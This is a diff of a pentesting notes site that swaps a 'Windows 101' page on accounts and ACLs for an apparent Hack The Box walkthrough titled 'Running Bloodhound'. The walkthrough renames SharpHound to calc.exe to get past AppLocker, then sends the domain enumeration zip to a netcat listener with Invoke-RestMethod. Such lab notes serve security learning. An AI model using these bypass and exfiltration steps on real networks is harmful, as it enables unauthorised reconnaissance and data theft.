@@ -6,7 +6,7 @@
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="generator" content="Docutils 0.17.1: http://docutils.sourceforge.net/" />
 
-    <title>Windows 101 &#8212; The InfoSec Bible</title>
+    <title>Running Bloodhound &#8212; The InfoSec Bible</title>
     
   <link href="../_static/css/theme.css" rel="stylesheet">
   <link href="../_static/css/index.ff1ffe594081f20da1ef19478df9384b.css" rel="stylesheet">
@@ -52,8 +52,8 @@
     <script async="async" src="../_static/sphinx-thebe.js"></script>
     <link rel="index" title="Index" href="../genindex.html" />
     <link rel="search" title="Search" href="../search.html" />
-    <link rel="next" title="Running Bloodhound" href="bluthund.html" />
-    <link rel="prev" title="Welcome to the Jungle" href="../intro.html" />
+    <link rel="next" title="PowerShell for Pentesters" href="powershell101.html" />
+    <link rel="prev" title="Windows 101" href="101.html" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="docsearch:language" content="None">
     
@@ -103,13 +103,13 @@
  </span>
 </p>
 <ul class="current nav bd-sidenav">
- <li class="toctree-l1 current active">
-  <a class="current reference internal" href="#">
+ <li class="toctree-l1">
+  <a class="reference internal" href="101.html">
    Windows 101
   </a>
  </li>
- <li class="toctree-l1">
-  <a class="reference internal" href="bluthund.html">
+ <li class="toctree-l1 current active">
+  <a class="current reference internal" href="#">
    Running Bloodhound
   </a>
  </li>
@@ -287,7 +287,7 @@
         <!-- ipynb file if we had a myst markdown file -->
         
         <!-- Download raw file -->
-        <a class="dropdown-buttons" href="../_sources/windows/101.md"><button type="button"
+        <a class="dropdown-buttons" href="../_sources/windows/bluthund.md"><button type="button"
                 class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
                 data-placement="left">.md</button></a>
         <!-- Download PDF via print -->
@@ -307,7 +307,7 @@
                 data-toggle="tooltip" data-placement="left" title="Source repository"><i
                     class="fab fa-github"></i>repository</button></a>
         <a class="issues-button"
-            href="https://github.com/executablebooks/jupyter-book/issues/new?title=Issue%20on%20page%20%2Fwindows/101.html&body=Your%20issue%20content%20here."><button
+            href="https://github.com/executablebooks/jupyter-book/issues/new?title=Issue%20on%20page%20%2Fwindows/bluthund.html&body=Your%20issue%20content%20here."><button
                 type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="left"
                 title="Open an issue"><i class="fas fa-lightbulb"></i>open issue</button></a>
         
@@ -328,55 +328,6 @@
         <!-- Table of contents -->
         <div class="d-none d-md-block col-md-2 bd-toc show">
             
-            <div class="tocsection onthispage pt-5 pb-3">
-                <i class="fas fa-list"></i> Contents
-            </div>
-            <nav id="bd-toc-nav" aria-label="Page">
-                <ul class="visible nav section-nav flex-column">
- <li class="toc-h2 nav-item toc-entry">
-  <a class="reference internal nav-link" href="#user-accounts">
-   User Accounts
-  </a>
- </li>
- <li class="toc-h2 nav-item toc-entry">
-  <a class="reference internal nav-link" href="#service-accounts">
-   Service Accounts
-  </a>
- </li>
- <li class="toc-h2 nav-item toc-entry">
-  <a class="reference internal nav-link" href="#groups">
-   Groups
-  </a>
-  <ul class="nav section-nav flex-column">
-   <li class="toc-h3 nav-item toc-entry">
-    <a class="reference internal nav-link" href="#regular-groups">
-     <em>
-      Regular Groups
-     </em>
-    </a>
-   </li>
-   <li class="toc-h3 nav-item toc-entry">
-    <a class="reference internal nav-link" href="#psuedo-groups">
-     <em>
-      Psuedo Groups
-     </em>
-    </a>
-   </li>
-  </ul>
- </li>
- <li class="toc-h2 nav-item toc-entry">
-  <a class="reference internal nav-link" href="#resources">
-   Resources
-  </a>
- </li>
- <li class="toc-h2 nav-item toc-entry">
-  <a class="reference internal nav-link" href="#acls-aces">
-   ACLs &amp; ACEs
-  </a>
- </li>
-</ul>
-
-            </nav>
         </div>
     </div>
 </div>
@@ -385,98 +336,67 @@
         
               <div>
                 
-  <section class="tex2jax_ignore mathjax_ignore" id="windows-101">
-<h1>Windows 101<a class="headerlink" href="#windows-101" title="Permalink to this headline">¶</a></h1>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># List Files</span>
-dir
-Get-ChildItem
+  <section id="running-bloodhound">
+<h1>Running Bloodhound<a class="headerlink" href="#running-bloodhound" title="Permalink to this headline">¶</a></h1>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># In one TMUX pane</span>
+docker pull neo4j
+docker run --name ne04j -d -p <span class="m">7473</span>:7473 -p <span class="m">7474</span>:7474 -p <span class="m">7687</span>:7687 -v <span class="nv">$HOME</span>/neo4j/data:/data -v <span class="nv">$HOME</span>/neo4j/logs:/logs -v <span class="nv">$HOME</span>/neo4j/import:/var/lib/neo4j/import -v <span class="nv">$HOME</span>/neo4j/plugins:/plugins --env 
+<span class="nv">NEO4J_AUTH</span><span class="o">=</span>neo4j/test neo4j:latest
 
-<span class="c1"># List Files Recursively</span>
-dir /s
-Get-ChildItem -Recurse
-
-<span class="c1"># List Files Including Hidden Files</span>
-dir /a
-Get-ChildItem -Hidden
+<span class="c1"># In another TMUX pane</span>
+sudo ./BloodHound --no-sandbox 
 </pre></div>
 </div>
-<section id="user-accounts">
-<h2>User Accounts<a class="headerlink" href="#user-accounts" title="Permalink to this headline">¶</a></h2>
-<p>These are the basic account(s) that you would use to log into a Windows machine.</p>
-<p>They are a collection of settings/preferences bound to a unique identity. i.e. the username and the files linked to that account along with other preferences such as installed applications and group membership(s), all the various things that could be associated with a user account.</p>
-<p>The local “Administrator” account is created by default during the installation process. It is not directly available to log in, similar to the <code class="docutils literal notranslate"><span class="pre">root</span></code> account on modern Linux systems, with the difference being that it can be activated using <code class="docutils literal notranslate"><span class="pre">net</span> <span class="pre">user</span> <span class="pre">administrator</span> <span class="pre">/active:yes</span></code> and it will become an account that appears on the login screen.</p>
-<p>Depending on the version of Windows that is running there may be several other default User accounts such as “Guest”.</p>
-</section>
-<section id="service-accounts">
-<h2>Service Accounts<a class="headerlink" href="#service-accounts" title="Permalink to this headline">¶</a></h2>
-<p>Used to run services (duh), services are programs that are being ran either constantly (in the case of web servers and FTP applications) or on a scheduled basis by a dedicated account with permissions set up specifically for that account. So in the case of the <code class="docutils literal notranslate"><span class="pre">NT</span> <span class="pre">AUTHORITY\IUSR</span></code> account which is used to control the IIS web service, it has specific permissions which allow it to manage the web server and all of it’s associated functions.</p>
-<p>They cannot be used to log in to Windows directly. But they are capable of granting a “user” shell, which will allow for access to the system but with generally limited capabilites and permissions.</p>
-<p>The <code class="docutils literal notranslate"><span class="pre">NT</span> <span class="pre">AUTHORITY\SYSTEM</span></code> account is a default service account created during installation which has the highest privileges of any local account on Windows. It is the Windows equivalent of the “root” account and has <em>full</em> control over any application or user account on the system. In some instances it will even be a trusted account on other machines in the same network allowing for lateral movement.</p>
-<p>There are other default service accounts that are created during the installation process, such as NETWORK SERVICE and LOCAL SERVICE, and the aforementioned IUSR.</p>
-</section>
-<section id="groups">
-<h2>Groups<a class="headerlink" href="#groups" title="Permalink to this headline">¶</a></h2>
-<p>User accounts can belong to multiple groups, and groups can have multiple users (same as Linux). Not much else to explain here, just bear in mind that there are LOTS of groups on Windows systems, and especially when it comes to AD/Domain controllers you’re going to have to get your reference sheets out and run things like <code class="docutils literal notranslate"><span class="pre">BloodHound</span></code> to map all of the interactions between the groups.</p>
-<p>Groups allow for easier access control configuration by allowing multiple users the same level of access to a resource. We could created a group called “Tech_Admins” and give them access to restart/modify specific services and applications to allow them to perform maintenance or upgrades.</p>
-<p>There are two types of groups:</p>
-<section id="regular-groups">
-<h3><em>Regular Groups</em><a class="headerlink" href="#regular-groups" title="Permalink to this headline">¶</a></h3>
-<p>These groups have a set list of members and are created by the domain or system Administrator(s), with the exception of the default groups such as “Users” which contain ALL regular (non-service) users of a system.</p>
-</section>
-<section id="psuedo-groups">
-<h3><em>Psuedo Groups</em><a class="headerlink" href="#psuedo-groups" title="Permalink to this headline">¶</a></h3>
-<p>These groups have a dynamic list of users that can change based on certain interactions, i.e. the “Authenticated Users” group contains a list of members who are CURRENTLY authenticated to the system.</p>
-</section>
-</section>
-<section id="resources">
-<h2>Resources<a class="headerlink" href="#resources" title="Permalink to this headline">¶</a></h2>
-<p>Windows has a concept of resources known as Objects, there are multiple types of these:</p>
-<ul class="simple">
-<li><p>Files/Directories</p></li>
-<li><p>Registry Entries</p></li>
-<li><p>Services</p></li>
-</ul>
-<p>Everything is treated as an object and every object has a set of permissions attached to it. In most cases these are inherited from the parent directory but it is not allways the case and can lead to vulnerabilities we can take advantage of, and sometimes the inheritence itself is the thing we will look to take advantage of.</p>
-<p>Whether a user has permission to perform certain actions on a resource will depend on what Groups that User is a member of and what permissions the User has.</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>whoami          <span class="c1"># computername\username</span>
-whoami /logonid <span class="c1"># Gets the SID for our user</span>
-whoami /priv    <span class="c1"># Permissions</span>
-whoami /groups  <span class="c1"># Group Membership</span>
-whoami /all     <span class="c1"># All the above at once</span>
+<p>Find a writeable directory on the box and use a <code class="docutils literal notranslate"><span class="pre">python</span></code> web server to get the files onto the target. (Use the SharpHound.exe)</p>
+<p>Try to run it and get knocked back!</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>.<span class="se">\S</span>harpHound.exe                                                                                     
+Program <span class="s1">&#39;SharpHound.exe&#39;</span> failed to run: This program is blocked by group policy. For more information, contact your system administratorAt line:1 char:1
++ .<span class="se">\S</span>harpHound.exe                                                                                   
++ ~~~~~~~~~~~~~~~~.                                                                                  
+At line:1 char:1                                                                                     
++ .<span class="se">\S</span>harpHound.exe                                                                                                                                                                                         
++ ~~~~~~~~~~~~~~~~                                
+    + CategoryInfo          : ResourceUnavailable: <span class="o">(</span>:<span class="o">)</span> <span class="o">[]</span>, ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed  
 </pre></div>
 </div>
-</section>
-<section id="acls-aces">
-<h2>ACLs &amp; ACEs<a class="headerlink" href="#acls-aces" title="Permalink to this headline">¶</a></h2>
-<p>Permissions to access resources (<em>Objects</em>) in Windows are controlled by the ACLs or Access Control Lists for that resource.</p>
-<p>Each ACL is made up of zero or more access control entries (ACEs)</p>
-<p>Each ACE define the relationship between a Principal (the name Windows uses for Users and Groups) and a certain access right.</p>
-<p>To view the ACL for a particular Object you can use the GUI to open the Advanced Security Settings menu, or you can run the following command in PowerShell:</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Get-ACL &lt;file&gt;
-</pre></div>
-</div>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>PS C:<span class="se">\U</span>sers<span class="se">\M</span>rBullsec<span class="se">\D</span>ocuments&gt; Get-Acl .<span class="se">\n</span>otes_checklist.md
+<p>This is an <code class="docutils literal notranslate"><span class="pre">AppLocker</span></code> issue. To get around this we need to run the binary from a “white listed” directory on the target. We can get a list of these directories from <a class="reference external" href="https://github.com/api0cradle/UltimateAppLockerByPassList">this link</a></p>
+<blockquote>
+<div><p>Just to be safe I also renamed the binary to <code class="docutils literal notranslate"><span class="pre">calc.exe</span></code> no idea if that is going to make a difference but it makes me feel better</p>
+</div></blockquote>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>mv SharpHound.exe calc.exe
+copy calc.exe C:<span class="se">\W</span>indows<span class="se">\t</span>emp<span class="se">\c</span>alc.exe
+C:<span class="se">\W</span>indows<span class="se">\t</span>emp<span class="se">\c</span>alc.exe
+------------------------------------------------                                                     
+Initializing SharpHound at <span class="m">7</span>:26 AM on <span class="m">12</span>/12/2020
+------------------------------------------------                                                     
+                                                  
+Resolved Collection Methods: Group, Sessions, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container
+                                                  
+<span class="o">[</span>+<span class="o">]</span> Creating Schema map <span class="k">for</span> domain HTB.LOCAL using path <span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>HTB,DC<span class="o">=</span>LOCAL   
+<span class="o">[</span>+<span class="o">]</span> Cache File not Found: <span class="m">0</span> Objects in cache   
+                                                                                                     
+<span class="o">[</span>+<span class="o">]</span> Pre-populating Domain Controller SIDS      
+Status: <span class="m">0</span> objects finished <span class="o">(</span>+0<span class="o">)</span> -- Using <span class="m">19</span> MB RAM                                                   
+Status: <span class="m">61</span> objects finished <span class="o">(</span>+61 ì<span class="o">)</span>/s -- Using <span class="m">27</span> MB RAM
+Enumeration finished in <span class="m">00</span>:00:00.4003317
+Compressing data to .<span class="se">\2</span>0201212072610_BloodHound.zip
+You can upload this file directly to the UI
 
-
-    Directory: C:<span class="se">\U</span>sers<span class="se">\M</span>rBullsec<span class="se">\D</span>ocuments
-
-
-Path               Owner         Access
-----               -----         ------
-notes_checklist.md CC1<span class="se">\M</span>rBullsec NT AUTHORITY<span class="se">\S</span>YSTEM Allow  FullControl...
+SharpHound Enumeration Completed at <span class="m">7</span>:26 AM on <span class="m">12</span>/12/2020! Happy Graphing!
 </pre></div>
 </div>
-<p>or the following in CMD.exe:</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>icacls &lt;file&gt;
+<blockquote>
+<div><p>2 hours later…</p>
+</div></blockquote>
+<p>Finally got the ZIP file off the box and onto our machine:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># On our Kali box</span>
+nc -lvnp <span class="m">1337</span> &gt; bloodhound_results.zip
+<span class="c1"># On the target</span>
+Invoke-RestMethod -Uri http://10.10.14.3:1337/ -Method Post -InFile bloodhound.zip
 </pre></div>
 </div>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>PS C:<span class="se">\U</span>sers<span class="se">\M</span>rBullsec<span class="se">\D</span>ocuments&gt; icacls .<span class="se">\n</span>otes_checklist.md
-.<span class="se">\n</span>otes_checklist.md NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>I<span class="o">)(</span>F<span class="o">)</span>
-                     BUILTIN<span class="se">\A</span>dministrators:<span class="o">(</span>I<span class="o">)(</span>F<span class="o">)</span>
-                     CC1<span class="se">\M</span>rBullsec:<span class="o">(</span>I<span class="o">)(</span>F<span class="o">)</span>
-</pre></div>
-</div>
-</section>
+<p>Only way to tell if it’s finished is to compare the size of the files on the Kali box and the host.</p>
 </section>
 
     <script type="text/x-thebe-config">
@@ -504,17 +424,17 @@ notes_checklist.md CC1<span class="se">\M</span>rBullsec NT AUTHORITY<span class
         
             <!-- Previous / next buttons -->
 <div class='prev-next-area'> 
-    <a class='left-prev' id="prev-link" href="../intro.html" title="previous page">
+    <a class='left-prev' id="prev-link" href="101.html" title="previous page">
         <i class="fas fa-angle-left"></i>
         <div class="prev-next-info">
             <p class="prev-next-subtitle">previous</p>
-            <p class="prev-next-title">Welcome to the Jungle</p>
+            <p class="prev-next-title">Windows 101</p>
         </div>
     </a>
-    <a class='right-next' id="next-link" href="bluthund.html" title="next page">
+    <a class='right-next' id="next-link" href="powershell101.html" title="next page">
     <div class="prev-next-info">
         <p class="prev-next-subtitle">next</p>
-        <p class="prev-next-title">Running Bloodhound</p>
+        <p class="prev-next-title">PowerShell for Pentesters</p>
     </div>
     <i class="fas fa-angle-right"></i>
     </a>
